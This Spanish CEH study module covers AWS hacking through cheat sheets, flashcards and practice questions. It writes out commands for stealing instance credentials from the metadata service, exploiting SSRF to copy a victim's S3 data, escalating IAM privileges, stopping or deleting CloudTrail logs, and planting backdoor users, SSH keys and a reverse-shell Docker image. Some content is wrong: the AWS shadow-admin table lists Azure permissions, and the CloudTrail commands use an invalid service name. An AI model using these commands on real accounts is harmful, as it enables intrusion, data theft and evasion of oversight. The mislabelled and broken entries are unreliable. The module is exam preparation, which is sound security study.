# M19_06 — AWS Hacking
**Módulo 19 / Subapartado 6 — AWS Hacking**

---

## 1. Conceptos y definiciones

### 🔴 Enumeración de S3 Buckets — técnicas y herramientas

**Técnicas de identificación de buckets:**

| Técnica | Mecanismo |
|---------|----------|
| **Inspecting HTML** | Análisis del código fuente HTML → URLs de buckets S3 en background |
| **Brute-forcing URL** | Fuerza bruta sobre `http://s3.amazonaws.com/[bucket_name]`; herramienta: **Burp Suite (Burp Intruder)** |
| **Advanced Google Hacking** | Google Dorks con `inurl:`, `site:`, `intext:`, `intitle:` |

**Google Dorks para S3:**
```
inurl: s3.amazonaws.com
inurl: s3.amazonaws.com/backup/
site:s3.amazonaws.com inurl:facebook
site:s3.amazonaws.com "facebook"
inurl:"s3.amazonaws.com" intext:"facebook"
```

**Herramientas de enumeración S3:**

| Herramienta | Función principal |
|------------|-----------------|
| **S3Scanner** | Identifica buckets abiertos; recupera objetos y ACL (permisos read/write) |
| **BucketLoot** | Enumera permisos; extrae URLs, subdominios y dominios de buckets expuestos |
| **CloudBrute** | Brute force/diccionario sobre múltiples CSPs (Amazon, Google, Microsoft, DigitalOcean, Alibaba, Vultr, Linode); usa IPINFO API |
| **CloudBrute** | También: Bucket Flaws, lazys3, Bucket Finder, s3-buckets-bruteforcer |

**Sintaxis S3Scanner:**
```bash
s3scanner -bucket <filename>                          # Escanear un bucket
s3scanner -bucket-file <filename>.txt -enumerate      # Escanear lista de buckets
s3scanner -bucket-file names.txt                      # Escanear lista
s3scanner -bucket <filename> -threads 8               # Con 8 threads
```

**Sintaxis BucketLoot:**
```bash
python bucketloot.py -l <file>    # Listar buckets públicamente accesibles
python bucketloot.py -c <file>    # Comprobar permisos
python bucketloot.py -d <file>    # Descargar datos de buckets públicos
```

**Sintaxis CloudBrute:**
```bash
./cloudbrute -d <target.com> -k <keyword> -t 80 -T 10 -w /<path_to_wordlist>.txt
# -d: dominio objetivo (amazon.com, microsoft.com, google.com)
# -k: keyword (ej. facebook)
# -t: threads (aquí 80)
# -T: timeout
# -w: wordlist
```

**Explotación de S3 misconfigured (comandos aws CLI):**
```bash
aws s3 ls s3://[bucket_name]
aws s3 ls s3://[bucket_name] --no-sign-request        # Sin credenciales
aws s3 mv FileName s3://[bucket]/test-file.txt --no-sign-request   # Mover
aws s3 cp FileName s3://[bucket]/test-file.svg --no-sign-request   # Copiar
aws s3 rm s3://[bucket]/test-file.svg --no-sign-request            # Borrar
```

---

### 🔴 Enumeración de EC2 — comandos clave

```bash
aws ec2 describe-instances                             # Listar instancias
aws ec2 describe-instances --filters Name=metadata-options.http-tokens,Values=optional  # Detectar IMDSv1
aws ec2 describe-instance-attribute --instance-id <id> --attribute userData --output text --query "UserData.Value" | base64 --decode  # Extraer user data (busca secretos)
aws ec2 describe-volumes                               # Listar volúmenes
aws ec2 describe-snapshots                             # Listar snapshots (¿alguno público?)
aws ec2 describe-security-groups                       # Listar security groups
aws ec2 describe-key-pairs                             # Listar SSH keys
aws ec2 describe-vpcs                                  # Detalles de VPCs
aws ec2 describe-subnets                               # Listar subnets
aws ec2 describe-vpc-endpoints                         # Listar VPC endpoints
aws ec2 describe-vpc-peering-connections               # Conexiones entre VPCs
aws ec2 describe-internet-gateways                     # Gateways
aws ec2 describe-iam-instance-profile-associations     # Perfiles IAM de instancias
aws iam get-instance-profile --instance-profile-name <profile>  # Rol de un profile
```

---

### 🔴 Enumeración de RDS — comandos clave

```bash
aws rds describe-db-instances                          # Todas las instancias RDS
aws rds describe-db-security-groups                    # Security groups de DB
aws rds describe-db-instance-automated-backups         # Backups automáticos
aws rds describe-db-snapshots                          # Todos los snapshots
aws rds describe-db-snapshots --include-public --snapshot-type public  # Snapshots públicos entre cuentas
aws rds describe-db-snapshots --snapshot-type public   # Snapshots públicos ya existentes
```
> Requiere permiso IAM: **`rds:DescribeDBInstances`**

---

### 🔴 IAM — Enumeración y escalada de privilegios

#### Técnicas de enumeración de IAM roles
Los mensajes de error de AWS **revelan si un rol existe** aunque no pueda asumirse. Diferente mensaje para "rol existente sin permiso" vs. "rol inexistente". Los atacantes usan wordlists para bruteforcear nombres de roles.

**Información obtenida via IAM role enumeration:**
- Software/stacks internos
- Nombres de usuarios IAM (→ social engineering)
- Servicios AWS en uso
- Software de terceros en uso (CloudSploit, Datadog, Okta)

**Herramientas de IAM:**

| Herramienta | Función |
|------------|---------|
| **Principal Mapper (PMapper)** | Visualiza usuarios IAM y roles en grafo direccional; identifica oportunidades de privilege escalation y attack paths |
| **Cloudsplaining** | Analiza políticas IAM; genera reports HTML con permisos excesivos. **No requiere privilegios admin**, solo read-only sobre IAM |
| **Pacu** | Framework de explotación AWS open-source; wordlist de 1100+ nombres de roles; auto-asume roles misconfigured; expone credenciales en JSON |
| **SkyArk** | Módulos AWStealth y AzureStealth; descubre entidades (users, groups, roles) con permisos más sensibles y de mayor riesgo |
| **Red-Shadow** | Identifica y explota shadow admin accounts en AWS |

**Cloudsplaining — pasos:**
```bash
# Step 1: Exportar políticas IAM
aws iam get-account-authorization-details --output json > account-auth-details.json
# Step 2: Escanear y generar reporte
cloudsplaining scan --input-file account-auth-details.json --output ./cloudsplaining-report
# Step 3: Abrir el reporte HTML generado
```

#### 🔴 Técnicas de AWS IAM Privilege Escalation

| Permiso abusado | Técnica de escalada |
|----------------|---------------------|
| `iam:CreatePolicyVersion` | Crear nueva versión de política con permisos custom + `--set-as-default` → admin access |
| `iam:SetDefaultPolicyVersion` | Cambiar versión default a una política no-default con más permisos |
| `iam:PassRole` + `ec2:RunInstances` | Crear EC2 con instance profile existente → acceder a AWS keys desde metadata |
| `iam:CreateAccessKey` | Crear access keys para otros usuarios → heredar sus permisos |
| `iam:CreateLoginProfile` | Crear perfil de login en consola AWS → acceso como ese usuario |
| `iam:UpdateLoginProfile` | Cambiar perfil de login de otros usuarios |
| `iam:AttachUserPolicy` | Attachar política a usuario propio → permisos de esa política |
| `iam:AttachGroupPolicy` / `iam:AttachRolePolicy` | Manipular políticas de grupo o rol |
| `iam:PutUserPolicy` / `iam:PutGroupPolicy` / `iam:PutRolePolicy` | Crear/actualizar inline policies → full admin |
| `iam:AddUserToGroup` | Añadirse a grupo IAM existente → heredar privilegios del grupo |

---

### IMDS Attack — obtención de cloud keys

**IMDSv1** (vulnerable — sin autenticación):
```bash
# Listar roles de la instancia
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Obtener cloud keys de un rol específico
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM-Role-Name>
# IPv6 para instancias Nitro EC2
curl http://[fd00:ec2::254]/latest/meta-data/iam/security-credentials/
```

**IMDSv2** (con token):
```bash
# Generar token (TTL: 21600 segundos = 6 horas)
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
# Usar token en peticiones
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
```

---

### Enumeración de Cognito

```bash
aws cognito-idp list-user-pools                                    # Listar user pools
aws cognito-idp describe-user-pool --user-pool-id <UserPoolId>     # Detalles de user pool
aws cognito-identity list-identity-pools                           # Listar identity pools
aws cognito-identity describe-identity-pool --identity-pool-id <id>  # Detalles de identity pool
aws cognito-idp sign-up --client-id <ClientId> --username <user> --password ... # Comprobar si username existe
```

**Permisos requeridos:**
- User Pools: `cognito-idp:ListUserPools`, `cognito-idp:DescribeUserPool`
- Identity Pools: `cognito-identity:ListIdentityPools`, `cognito-identity:DescribeIdentityPool`

---

### Enumeración de Serverless (Lambda + DynamoDB)

```bash
aws lambda list-functions                                          # Listar todas las funciones Lambda
aws lambda get-function --function-name <name>                     # Info + versión
aws lambda list-function-url-configs --function-name <name>       # URLs expuestas (HTTP directo)
aws lambda get-function-url-config --function-name <name>         # Config de URL específica
aws dynamodb list-tables                                           # Tablas DynamoDB
aws dynamodb describe-table --table-name <name>                   # Detalles de tabla
aws dynamodb list-global-tables                                    # Tablas globales
aws apigateway get-rest-apis                                       # API Gateway REST APIs
aws apigateway get-rest-api --rest-api-id <id>                    # Info de API específica
```

---

### Herramientas de descubrimiento de attack paths

| Herramienta | Función | Plataformas |
|------------|---------|------------|
| **Cartography** | Mapea la postura de seguridad cloud; construye grafo de relaciones/dependencias; identifica misconfigurations y attack paths. Usa **Neo4j** para queries | AWS, GCP, OCI, Azure, Okta |
| **CloudFox** | CLI para identificar attack paths explotables; escanea secrets en EC2 user data, variables de entorno, permisos admin, role trusts, hosts, IPs, filesystems | AWS, Azure, GCP |
| **Endgame** | Post-exploitation; crea backdoor accounts en recursos AWS a través de cuenta rogue. Requiere credenciales con permisos para modificar resource policies | AWS |
| **DumpsterDiver** | Escanea grandes volúmenes de ficheros buscando claves hardcoded (AWS access keys, SSL, Azure keys). Busca patrón `AKIA` seguido de 16 caracteres alfanuméricos | Local/cloud |
| **Stratus Red Team** | "Atomic Red Team para cloud"; emula técnicas ofensivas mapeadas al **MITRE ATT&CK**; self-contained | AWS, GCP, Azure, Kubernetes |

**Cartography — queries Neo4j:**
```cypher
-- Instancias RDS en cuenta AWS
MATCH (aws:AWSAccount)-[r:RESOURCE]->(rds:RDSInstance) return *
-- RDS con cifrado desactivado
MATCH (a:AWSAccount)-[:RESOURCE]->(rds:RDSInstance{storage_encrypted:false}) RETURN a.name, rds.id
-- EC2 directamente expuestas a Internet
MATCH (instance:EC2Instance{exposed_internet: true}) RETURN instance.instanceid, instance.publicdnsname
```

**CloudFox — comandos clave:**
```bash
cloudfox aws --profile <profile> all-checks           # Enumeración completa
cloudfox aws --profile <profile> -v2 access-keys      # Access keys activos de todos los usuarios
cloudfox aws --profile <profile> -v2 buckets          # Buckets
cloudfox aws -p <profile> ecs-tasks -v2               # Tareas ECS
cloudfox aws -p <profile> eni -v2                     # Elastic Network Interfaces
cloudfox aws --profile <profile> -v2 endpoints        # Endpoints vulnerables
cloudfox aws --profile <profile> permissions -v2      # Permisos IAM de un principal
cloudfox aws --profile <profile> -v2 secrets          # Secrets de SecretsManager y SSM
cloudfox aws --profile <profile> workloads            # Workloads con permisos admin
```

**Stratus Red Team — comandos:**
```bash
aws-vault exec sandbox-account                        # Autenticación
stratus list --platform AWS --mitre-attack-tactic persistence  # Listar técnicas de persistencia
stratus show <technique>                              # Detalles de técnica
stratus warmup <technique>                            # Preparar infraestructura SIN detonar
stratus detonate <technique>                          # Detonar técnica de ataque
stratus status                                        # Estado actual de técnicas
stratus cleanup <technique>                           # Limpiar infraestructura
stratus cleanup --all                                 # Limpiar todo
```

---

### 🔴 Manipulación de CloudTrail — covering tracks

CloudTrail es el servicio de monitorización de actividad de usuarios en AWS. **Por defecto está deshabilitado**; el admin debe configurarlo explícitamente.

```bash
# Detener logging (atacante pausa CloudTrail antes del ataque)
aws CloudTrail stop-logging --name targetcloud_trail --profile administrator
# Verificar estado
aws CloudTrail get-trail-status --name targetcloud_trail --profile administrator
# Reanudar logging (para evitar alertas post-ataque)
aws CloudTrail start-logging --name targetcloud_trail --profile administrator
# Eliminar trail permanentemente
aws CloudTrail delete-trail --name targetcloud_trail --profile administrator
# Eliminar el bucket que almacena los trails
aws s3 rb s3://<Bucket_Name> --force --profile administrator
```

**Otras técnicas de covering tracks en AWS:**
- Cifrar los cloud trails con una nueva clave
- Mover los trails a un nuevo S3 bucket
- Usar Lambda function para borrar nuevas entradas del trail

**Técnicas de persistencia post-access:**
- Manipular user data de instancias EC2 con privilegios
- Crear nuevas EC2 desde AMIs asignando rol privilegiado
- Insertar backdoor en Lambda existente (ej. función que crea nuevo usuario al invocarse)
- Manipular access keys mediante Lambda (rabbit_lambda, cli_lambda, backdoor_created_users_lambda)

---

### Persistence en EC2 — técnicas

| Técnica | Mecanismo |
|---------|----------|
| **Creating Backdoor Users** | `aws iam create-user` + `aws iam attach-user-policy` con `AdministratorAccess` |
| **Altering Startup Scripts** | Modificar `/etc/rc.local`, `/etc/init.d/` o `systemd` para ejecutar script malicioso en cada reinicio |
| **SSH Key Injection** | Añadir SSH public key del atacante a `~/.ssh/authorized_keys` → acceso sin contraseña |
| **Installing Rootkits** | Ocultar procesos y ficheros de herramientas de monitorización |
| **Leveraging IAM Roles** | Crear nuevos roles con privilegios elevados; `aws iam create-role` + `aws iam attach-role-policy` con `AdministratorAccess` |

---

### Lateral Movement en AWS

```bash
# Step 1: Identificar roles con políticas permisivas
aws iam list-roles
aws iam get-role --role-name <role>     # ARN, path, trust policy

# Step 2: Asumir rol en cuenta destino
aws sts assume-role --role-arn arn:aws:iam::<target-account-id>:role/<role> --role-session-name <session>
# Devuelve: AccessKeyId, SecretAccessKey, SessionToken

# Step 3: Configurar CLI con credenciales temporales
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>

# Step 4: Enumerar recursos con el rol asumido
aws s3 ls
aws iam list-attached-user-policies --user-name <user>
aws iam list-attached-role-policies --role-name <role>

# Step 5: Enumerar regiones disponibles
aws ec2 describe-regions
aws ec2 describe-instances --region <region>

# Step 6: Acceder a recursos en otras regiones
aws s3api list-buckets --query <filter>
```

---

### SSRF → AWS credentials

Cuando una app web es vulnerable a SSRF y usa HTTP con variable GET `url`:
1. El atacante envía petición a `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
2. Obtiene las credenciales temporales del rol IAM de la instancia
3. Las añade al CLI: `aws configure`
4. Verifica identidad: `aws sts get-caller-identity --profile stolen_profile`
5. Lista todos los buckets: `aws s3 ls --profile stolen_profile`
6. Sincroniza datos: `aws s3 sync s3://bucket-name /home/attacker/localstash/ --profile stolen_profile`

---

### Docker en AWS — CCAT (Cloud Container Attack Tool)

Pasos para explotar contenedores Docker en AWS:
1. **Enumerate ECR**: listar repositorios ECR usando credenciales AWS comprometidas
2. **Pull Repos from ECR**: descargar imagen Docker del repositorio
3. **Docker Backdoor**: crear backdoor para reverse shell reemplazando el comando CMD por defecto
4. **Push Repos to ECR**: subir imagen con backdoor de vuelta al repositorio ECR

---

### Shadow Admins en AWS

Shadow admins = cuentas con permisos específicos que permiten escalar privilegios. Técnicas de abuso:

| Permiso | Acción |
|---------|--------|
| `Microsoft.Authorization/elevateAccess/Action` | Elevar acceso a nivel admin |
| `Microsoft.Authorization/roleDefinitions/write` | Modificar roles existentes → crear nuevas cuentas admin |
| `Microsoft.Authorization/roleAssignments/write` | Asignar nuevos roles a cuentas privilegiadas |
| `Microsoft.Authorization/roleAssignments/*` (via AssignableScopes) | Asignar permisos adicionales a cualquier cuenta |

Herramientas: **SkyArk** (AWStealth + AzureStealth), **Red-Shadow**.

---

## 2. Exam Traps ⚠️

⚠️ **[CloudTrail — estado por defecto]**
CloudTrail está **deshabilitado por defecto** en AWS. El administrador debe configurarlo explícitamente. El examen puede presentarlo como activo por defecto.

⚠️ **[IMDSv1 — IP]**
La IP del servicio IMDS es **169.254.169.254**. Para instancias Nitro EC2, se usa la dirección IPv6 `fd00:ec2::254`. El examen puede preguntar la IP exacta.

⚠️ **[IMDSv2 — mecanismo de seguridad]**
IMDSv2 requiere primero obtener un token con `PUT` y luego usarlo en el header `X-aws-ec2-metadata-token`. IMDSv1 no requiere token → más vulnerable. La detección de instancias con IMDSv1 se hace con `--filters Name=metadata-options.http-tokens,Values=optional`.

⚠️ **[Cloudsplaining — privilegios requeridos]**
Cloudsplaining **no requiere privilegios de admin**; solo necesita acceso de lectura (read-only) a las políticas IAM. El examen puede afirmar que requiere privilegios elevados.

⚠️ **[Pacu — wordlist]**
Pacu contiene una wordlist de **1100+ nombres de roles** para enumeración. Dato concreto preguntable.

⚠️ **[DumpsterDiver — patrón AWS]**
DumpsterDiver busca el patrón `AKIA` seguido de **16 caracteres alfanuméricos** como formato estándar de AWS access keys. El examen puede preguntar el patrón de detección.

⚠️ **[Stratus Red Team — framework de referencia]**
Stratus Red Team mapea técnicas al **MITRE ATT&CK** framework. Está inspirado en Atomic Red Team. El examen puede confundirlo con otras herramientas de compliance.

⚠️ **[S3 — URL format]**
El formato de URL de un bucket S3 es `http://s3.amazonaws.com/[bucket_name]` o `http://[bucket_name].s3.amazonaws.com/`. El examen puede presentar formatos incorrectos.

⚠️ **[iam:CreatePolicyVersion — flag crítico]**
Al crear una nueva versión de política con `iam:CreatePolicyVersion`, el atacante incluye `--set-as-default` para establecerla como versión default **sin necesitar** `iam:SetDefaultPolicyVersion`. Son dos técnicas distintas con permisos distintos.

⚠️ **[Lateral movement — credenciales temporales]**
`aws sts assume-role` devuelve **tres elementos**: AccessKeyId, SecretAccessKey y **SessionToken**. Los tres son necesarios para configurar el CLI con credenciales temporales. El examen puede omitir el SessionToken.

⚠️ **[CCAT — orden de pasos]**
En CCAT el orden es: Enumerate ECR → Pull imagen → Crear backdoor → **Push imagen modificada de vuelta al ECR**. El examen puede alterar el orden o presentar el push como opcional.

⚠️ **[Endgame — tipo de herramienta]**
Endgame es una herramienta de **post-exploitation** (requiere credenciales API con permisos para modificar resource policies). No es una herramienta de reconocimiento o escaneo.

---

## 3. Nemotécnicos

### Herramientas S3 — por función
- **Encontrar buckets**: S3Scanner, BucketLoot, CloudBrute, Bucket Flaws, lazys3
- **Brute-force URL**: Burp Suite (Burp Intruder)
- **Google Dorks**: `inurl`, `site`, `intext`, `intitle`

### CloudBrute flags
**"d-k-t-T-w"** → **d**omain | **k**eyword | **t**hreads | **T**imeout | **w**ordlist

### IAM Privilege Escalation — permisos → técnica
**"CrPol → nueva versión"** | **"SetDef → versión existente"** | **"PassRole+RunInst → EC2+metadata"** | **"CreateKey → otra cuenta"** | **"CreateLogin → consola"** | **"AttachUser/Group/Role → heredar política"** | **"Put*Policy → inline → full admin"** | **"AddToGroup → heredar grupo"**

### IMDS — IP a memorizar
**"169.254.169.254"** = link-local, solo accesible desde la instancia EC2.
IMDSv2: primero **PUT** para token, luego **GET** con header `X-aws-ec2-metadata-token`.

### CloudTrail — comandos clave
**"stop → get-status → start → delete → rb (bucket)"**
→ stop-logging | get-trail-status | start-logging | delete-trail | s3 rb --force

### Persistence en EC2 (5 técnicas)
**"BASK R L"** → **B**ackdoor users | **A**ltering startup scripts | **S**SH key injection | **R**ootkits | **L**everaging IAM roles

---

## 4. Flashcards

**Q:** ¿Cuál es el formato estándar de URL de un bucket S3?
**A:** `http://s3.amazonaws.com/[bucket_name]` o `http://[bucket_name].s3.amazonaws.com/`

---

**Q:** ¿Qué herramienta usa Burp Intruder para enumerar S3 buckets?
**A:** Brute-forcing de la URL del bucket: prueba todas las posibilidades para `[bucket_name]` en `http://s3.amazonaws.com/[bucket_name]`.

---

**Q:** ¿Qué hace CloudBrute que lo diferencia de S3Scanner?
**A:** CloudBrute realiza brute force/diccionario sobre múltiples CSPs (Amazon, Google, Microsoft, DigitalOcean, Alibaba, Vultr, Linode), no solo AWS. Usa IPINFO API para cloud detection.

---

**Q:** ¿Cuál es la IP del IMDS en AWS y qué devuelve la ruta `/latest/meta-data/iam/security-credentials/<role>`?
**A:** IP: `169.254.169.254`. Devuelve las cloud keys (AccessKeyId, SecretAccessKey, SessionToken) del rol IAM asociado a la instancia.

---

**Q:** ¿Qué diferencia IMDSv1 de IMDSv2 en términos de seguridad?
**A:** IMDSv1 no requiere autenticación (vulnerable a SSRF). IMDSv2 requiere obtener primero un token via PUT y usarlo en el header `X-aws-ec2-metadata-token` en cada petición.

---

**Q:** ¿Qué permiso IAM permite crear una nueva política con permisos custom sin necesitar SetDefaultPolicyVersion?
**A:** `iam:CreatePolicyVersion` con el flag `--set-as-default`.

---

**Q:** ¿Qué privilegios requiere Cloudsplaining para analizar políticas IAM?
**A:** Solo read-only sobre IAM. No requiere privilegios de administrador.

---

**Q:** ¿Cuántos nombres de roles contiene la wordlist de Pacu?
**A:** Más de 1100 nombres de roles.

---

**Q:** ¿Qué patrón busca DumpsterDiver para identificar AWS access keys?
**A:** El patrón `AKIA` seguido de 16 caracteres alfanuméricos.

---

**Q:** ¿A qué framework mapea sus técnicas Stratus Red Team?
**A:** MITRE ATT&CK framework. Está inspirado en Atomic Red Team.

---

**Q:** ¿Cuál es el estado por defecto de CloudTrail en AWS?
**A:** Deshabilitado. El administrador debe configurarlo y habilitarlo explícitamente.

---

**Q:** ¿Cuáles son las tres credenciales que devuelve `aws sts assume-role`?
**A:** AccessKeyId, SecretAccessKey y SessionToken.

---

**Q:** ¿Qué herramienta de AWS hacking visualiza usuarios y roles IAM en un grafo direccional para identificar privilege escalation?
**A:** Principal Mapper (PMapper).

---

**Q:** ¿Cuáles son los 4 pasos del ataque CCAT sobre Docker en AWS?
**A:** 1) Enumerate ECR (listar repositorios), 2) Pull imagen Docker, 3) Crear backdoor (reverse shell reemplazando CMD), 4) Push imagen con backdoor de vuelta al ECR.

---

**Q:** ¿Qué herramienta permite emular técnicas ofensivas cloud en modo granular y self-contained usando MITRE ATT&CK?
**A:** Stratus Red Team. Soporta AWS, GCP, Azure y Kubernetes.

---

**Q:** ¿Qué comando de CloudFox enumera workloads con permisos de administrador en AWS?
**A:** `cloudfox aws --profile <profile> workloads`

---

**Q:** ¿Cómo se detectan instancias EC2 que usan IMDSv1 mediante AWS CLI?
**A:** `aws ec2 describe-instances --filters Name=metadata-options.http-tokens,Values=optional`

---

**Q:** ¿Qué técnica de persistence en EC2 añade código malicioso en `/etc/rc.local`?
**A:** Altering Startup Scripts: modifica archivos de inicio (`/etc/rc.local`, `/etc/init.d/`, `systemd`) para ejecutar código malicioso en cada reinicio.

---

**Q:** ¿Cuál es la query de Cartography (Neo4j) para encontrar instancias EC2 expuestas directamente a Internet?
**A:** `MATCH (instance:EC2Instance{exposed_internet: true}) RETURN instance.instanceid, instance.publicdnsname`

---

---

## 5. Confusión frecuente

**S3Scanner vs. BucketLoot — funciones específicas**
- S3Scanner: identifica buckets abiertos y recupera **objetos y ACL** (permisos read/write).
- BucketLoot: enumera permisos y extrae **URLs, subdominios y dominios** de buckets expuestos. Más orientado a descubrimiento de endpoints ocultos.
- Criterio: si el escenario pregunta por ACL y contenido → S3Scanner. Si pregunta por URLs/subdominios expuestos → BucketLoot.

---

**Pacu vs. Endgame — fase de uso**
- Pacu: enumeración y explotación de IAM (asume roles misconfigured, wordlist de 1100+ roles, expone credenciales). Sirve tanto en exploitation como post-exploitation.
- Endgame: post-exploitation puro; crea backdoor accounts en recursos AWS a través de cuenta rogue. Requiere credenciales con permisos de modificación de resource policies.
- Criterio: si la pregunta es sobre asumir roles y enumerar IAM → Pacu. Si es sobre crear backdoors en recursos AWS → Endgame.

---

**IMDSv1 vs. IMDSv2 — vector de ataque**
- IMDSv1: una sola petición GET a `169.254.169.254` → credenciales expuestas. Vulnerable a SSRF sin protección adicional.
- IMDSv2: requiere PUT previo para token + header en cada petición → SSRF mucho más difícil de explotar.
- Criterio: si el escenario describe SSRF explotando el metadata service sin autenticación → IMDSv1. La contramedida es migrar a IMDSv2.

---

**Cloudsplaining vs. Principal Mapper (PMapper)**
- Cloudsplaining: analiza **políticas IAM** para identificar permisos excesivos; genera reporte HTML; solo necesita read-only.
- PMapper: visualiza **usuarios y roles** como grafo direccional; identifica rutas de privilege escalation entre entidades.
- Criterio: si la pregunta habla de analizar políticas con permisos excesivos → Cloudsplaining. Si habla de grafo de relaciones y rutas de escalada → PMapper.

---

**CloudTrail stop-logging vs. delete-trail**
- `stop-logging`: pausa temporalmente el logging; el trail sigue existiendo; el atacante lo reactiva después del ataque.
- `delete-trail`: elimina el trail permanentemente; genera alerta de seguridad.
- Alternativa más sigilosa: borrar el bucket S3 que almacena los trails (`aws s3 rb --force`) → CloudTrail no puede loggear sin destino.
- Criterio: si el escenario describe el atacante deteniendo y reactivando logs → stop/start-logging. Si describe eliminación permanente → delete-trail.

---

## 6. Preguntas de Práctica — Formato CEH

**P1.** Un pentester accede a una instancia EC2 y ejecuta `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`. Obtiene credenciales IAM temporales. ¿Qué vulnerabilidad explota y cuál es la contramedida principal?

A) Golden SAML Attack — contramedida: rotar certificados SAML  
B) IMDSv1 sin protección SSRF — contramedida: migrar a IMDSv2  
C) Cloudborne Attack — contramedida: re-flash del firmware BMC  
D) Side-Channel Attack — contramedida: micro-segmentación  

**Respuesta correcta: B**
**IMDSv1** permite obtener credenciales IAM con una simple petición GET a `169.254.169.254` sin autenticación adicional, siendo vulnerable a SSRF. La contramedida principal es migrar a **IMDSv2**, que requiere un PUT previo para obtener un token y luego incluirlo como header en cada petición — mucho más difícil de explotar vía SSRF.

---

**P2.** Un auditor IAM usa **Pacu** durante un pentest de AWS. ¿Cuál es la función específica de Pacu para escalada de privilegios IAM?

A) Crea backdoor accounts en recursos AWS a través de una cuenta rogue  
B) Asume roles mal configurados usando una wordlist de 1100+ nombres de rol  
C) Analiza políticas IAM para identificar permisos excesivos y genera reporte HTML  
D) Escanea S3 buckets públicos y sus ACLs  

**Respuesta correcta: B**
**Pacu** es un framework de explotación AWS que usa una **wordlist de más de 1100 nombres de rol** para intentar asumir roles mal configurados y escalar privilegios IAM. Endgame (no Pacu) crea backdoors en recursos. Cloudsplaining analiza políticas IAM. S3Scanner escanea buckets.

---

**P3.** Un pentester detecta S3 buckets con nombres predecibles. Usa **BucketLoot** para escanear dominios objetivo. ¿En qué se diferencia BucketLoot de S3Scanner?

A) BucketLoot escanea ACLs y contenido del bucket; S3Scanner escanea URLs y subdominios  
B) BucketLoot descubre URLs/subdominios expuestos en archivos del bucket; S3Scanner lista ACLs y contenido  
C) BucketLoot es para GCP; S3Scanner es solo para AWS  
D) Son herramientas equivalentes con la misma funcionalidad  

**Respuesta correcta: B**
**BucketLoot** descubre **URLs y subdominios expuestos** en archivos dentro de los buckets (útil para pivot a otros activos). **S3Scanner** se enfoca en listar **ACLs y contenido** del bucket (útil para evaluar permisos). Criterio: ACL y contenido → S3Scanner; URLs/subdominios expuestos → BucketLoot.

---

**P4.** Un atacante compromete un entorno AWS y quiere crear backdoors persistentes en múltiples recursos (S3, SQS, SNS) usando una cuenta rogue con permisos de modificación de resource policies. ¿Qué herramienta usa?

A) Pacu  
B) Endgame  
C) Cloudsplaining  
D) Principal Mapper (PMapper)  

**Respuesta correcta: B**
**Endgame** es una herramienta de **post-exploitation puro** que crea backdoor accounts en recursos AWS (S3, SQS, SNS, KMS, etc.) a través de una cuenta rogue. Requiere credenciales con permisos de modificación de resource policies. Pacu es para enumeración y explotación de IAM roles, no para backdoors en recursos.

---

**P5.** Un analista revisa las políticas IAM de una cuenta AWS usando **Cloudsplaining**. ¿Qué tipo de análisis realiza esta herramienta y qué nivel de acceso requiere?

A) Explotación activa de roles misconfigured; requiere privilegios administrativos  
B) Análisis de políticas IAM para identificar permisos excesivos; solo requiere acceso read-only  
C) Creación de backdoors en recursos AWS; requiere permisos de modificación  
D) Scanning de S3 buckets públicos; requiere acceso anónimo  

**Respuesta correcta: B**
**Cloudsplaining** analiza **políticas IAM** para identificar permisos excesivos o mal configurados y genera un **reporte HTML**. Requiere solo **acceso read-only** (no necesita permisos de explotación). Es una herramienta de auditoría, no de explotación activa.

---

**P6.** Un equipo de respuesta a incidentes investiga una cuenta AWS comprometida. Quiere identificar qué caminos de privilege escalation existen entre los usuarios IAM. ¿Qué herramienta deben usar?

A) S3Scanner  
B) BucketLoot  
C) Principal Mapper (PMapper)  
D) Endgame  

**Respuesta correcta: C**
**Principal Mapper (PMapper)** analiza y visualiza las **relaciones entre usuarios, grupos, roles y políticas IAM** para identificar caminos de escalada de privilegios. Genera un grafo que muestra qué entidades pueden escalar a qué roles. Es diferente de Cloudsplaining que solo analiza permisos excesivos sin mostrar los caminos de escalada.

---

**P7.** Un atacante descubre credenciales AWS hardcodeadas en un repositorio GitHub público. Verifica si las credenciales son válidas ejecutando `aws sts get-caller-identity`. El resultado confirma que pertenecen a un rol con permisos de administrador. ¿En qué fase de la metodología AWS hacking se encuentra?

A) Fase 1 — Information Gathering (encontrar credenciales)  
B) Fase 2 — Enumeration (verificar identidad y permisos)  
C) Fase 3 — Exploitation (escalar privilegios)  
D) Fase 4 — Post-Exploitation (mantener acceso)  

**Respuesta correcta: B**
**`aws sts get-caller-identity`** es un comando de **enumeración** que verifica qué identidad está usando las credenciales actuales y qué permisos tiene. Encontrar las credenciales es Fase 1. Verificar su validez y alcance es **Fase 2 — Enumeration**. Explotar esos permisos para acceder a recursos protegidos es Fase 3.

---

**P8.** Un cloud security engineer configura AWS para proteger contra ataques SSRF que podrían explotar el endpoint de metadatos. ¿Qué cambio específico hace IMDSv2 más seguro que IMDSv1?

A) IMDSv2 deshabilita completamente el endpoint de metadatos  
B) IMDSv2 requiere un PUT previo para obtener un token + incluirlo como header en peticiones GET  
C) IMDSv2 cifra las credenciales antes de enviarlas  
D) IMDSv2 solo permite acceso desde el propio proceso de la aplicación  

**Respuesta correcta: B**
**IMDSv2** requiere: (1) una petición **PUT** previa a `http://169.254.169.254/latest/api/token` para obtener un token de sesión, y (2) incluir ese token como header `X-aws-ec2-metadata-token` en cada petición GET posterior. Un atacante que explota SSRF normalmente solo puede hacer GET, no PUT — esto hace SSRF contra IMDSv2 **mucho más difícil de explotar**.
